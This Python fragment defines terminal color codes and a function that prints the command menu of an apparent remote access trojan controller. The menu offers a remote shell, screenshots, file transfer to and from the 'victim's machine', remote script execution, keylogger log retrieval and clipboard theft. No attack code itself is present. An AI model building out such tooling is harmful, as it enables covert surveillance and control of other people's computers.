class colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    WHITE = '\033[1;97m'

def mainMenu():
    print("+--------------------------------------------------------------+")
    print(f"{colors.OKGREEN}[+] Choose an option:" + '\n')
    print(f"{colors.OKGREEN}--shell" + f"{colors.ENDC} : Get a shell")
    print(f"{colors.OKGREEN}--ginfo" + f"{colors.ENDC} : Get target info")
    print(f"{colors.OKGREEN}--shutdown" + f"{colors.ENDC} : Shutdown target")
    print(f"{colors.OKGREEN}--close" + f"{colors.ENDC} : Close connection")
    print(f"{colors.OKGREEN}--screenshot" + f"{colors.ENDC} : Take a screenshot")
    print(f"{colors.OKGREEN}--upload" + f"{colors.ENDC} : Upload a file to the victim's machine")
    print(f"{colors.OKGREEN}--download" + f"{colors.ENDC} : Download victim's files")
    print(f"{colors.OKGREEN}--run" + f"{colors.ENDC} : Run python scrypt on the victim's machine")
    print(f"{colors.OKGREEN}--kill" + f"{colors.ENDC} : Kill processes" + f"{colors.WARNING} [WINDOWS ONLY]")
    print(f"{colors.OKGREEN}--msg" + f"{colors.ENDC} : Open message box" f"{colors.WARNING} [WINDOWS ONLY]")
    print(f"{colors.OKGREEN}--lock" + f"{colors.ENDC} : Lock PC" f"{colors.WARNING} [WINDOWS ONLY]")
    print(f"{colors.OKGREEN}--stop" + f"{colors.ENDC} : Stop key logger")
    print(f"{colors.OKGREEN}--ccb" + f"{colors.ENDC} : Get clipboard content")
    print(f"{colors.OKGREEN}--getlogs" + f"{colors.ENDC} : Get key logger logs" + '\n')
    print(f"{colors.FAIL}esc" + f"{colors.ENDC} : Exit")
    print("__________________________" + '\n' + "> ", end = '')
